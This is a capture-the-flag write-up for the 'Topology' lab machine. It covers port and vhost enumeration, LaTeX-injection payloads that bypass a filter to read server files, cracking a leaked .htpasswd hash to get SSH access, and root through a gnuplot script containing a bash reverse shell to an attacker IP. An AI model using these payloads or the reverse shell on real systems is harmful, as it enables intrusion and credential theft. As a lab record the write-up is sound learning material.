---
authors:
    - Lukas Daubner
date: 16-01-2024
---

# Topology

## Enumeration

### Nmap

`nmap -sV -Pn -p- 10.10.11.217`

```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-08 14:48 EDT
Nmap scan report for 10.10.11.217
Host is up (0.040s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.59 seconds
```

The web got one link to `http://latex.topology.htb/equation.php`. That looks interesting enought, but let's see if there are more subdomains.

## Subdomains/Vhosts

`ffuf -w ~/Tools/dnscan/subdomains-10000.txt -H "Host: FUZZ.topology.htb" -u http://topology.htb -fs 6650` The `-fs 6650` argument is to filter out size of negative responses. Just run the ffuf without it and you will see.

There are three subdomains

* topology.htb
* dev.topology.htb
* stats.topology.htb

## latex.topology.htb

The subdomain has directory browsing. But I cannot go beyond the root folder

pdfTeX, Version 3.14159265-2.6-1.40.20

The page `http://latex.topology.htb/equation.php` allows for latex input. I tried ordinary injections https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection but certain commands are forbidden. However, this seems more like PHP thing, than latex thing. So I tried to obfuscate the commands. passing `` \catcode`^=0 `` causes that all `^` symbol replaces `\`, which is aparently enough. Try:

```
\catcode`^=0
^alpha
```

NOTE: I used CyberChef to URL-encode the input

### File Read

So now for the file read. I was able to utilise one-line read (the `$` are for escaping)

```
$
\catcode`^=0
^newread^file
^openin^file=/etc/passwd
^read^file to^line
^text{^line}
$
```

but then I struggled to read it all. Then, after some fiddling I found taht you can use `\lstinputlisting` command to read a file verbatim.

```
$
\catcode`^=0
^lstinputlisting{/etc/passwd}
$
```

The key is using the math-mode escaping `$` and using verbatim input `lstinputlisting`.

After some proding I was able to pinpoint the location of `equation.php`

```
$
\catcode`^=0
^lstinputlisting{/var/www/latex/equation.php}
$
```

Apache configs: /etc/apache2/apache2.conf /etc/apache2/sites-available/000-default.conf

## dev.topology.htb

Login page

So, while googling for possible things to read, I read about how Apache2 stores configs. Then, I was able to read `/var/www/dev/.htpasswd`.

```
vdaisley:$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0
```

using Hahscat I started cracking: `hashcat -a 0 pass /usr/share/wordlists/rockyou.txt`

and BANG!: `$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0:calculus20`

Tried SSH and it worked

```
ssh vdaisley@10.10.11.217
# calculus20
```

## -> Root

Imidietly, I noticed `/opt/gnuplot` I can write, but I cannot read.

There is nice and easy PrivEsc: https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/gnuplot-privilege-escalation/ but I need to execute the scipt as root.

### Pspy

This is interesting

```
2023/08/08 20:48:01 CMD: UID=0     PID=23794  | /bin/sh /opt/gnuplot/getdata.sh 
2023/08/08 20:48:01 CMD: UID=0     PID=23793  | /bin/sh /opt/gnuplot/getdata.sh 
2023/08/08 20:48:01 CMD: UID=0     PID=23792  | /bin/sh /opt/gnuplot/getdata.sh 
2023/08/08 20:48:01 CMD: UID=0     PID=23796  | find /opt/gnuplot -name *.plt -exec gnuplot {} ; 
```

This happens after refresing the `stats.topology.htb` page.

### Exploitation

So I just put the script into the directory and fire a reverse shell.

```
cd /opt/gnuplot/
echo "system(\"bash -c 'bash -i >& /dev/tcp/10.10.16.100/7777 0>&1'\")" > script.plt
```

I am ROOT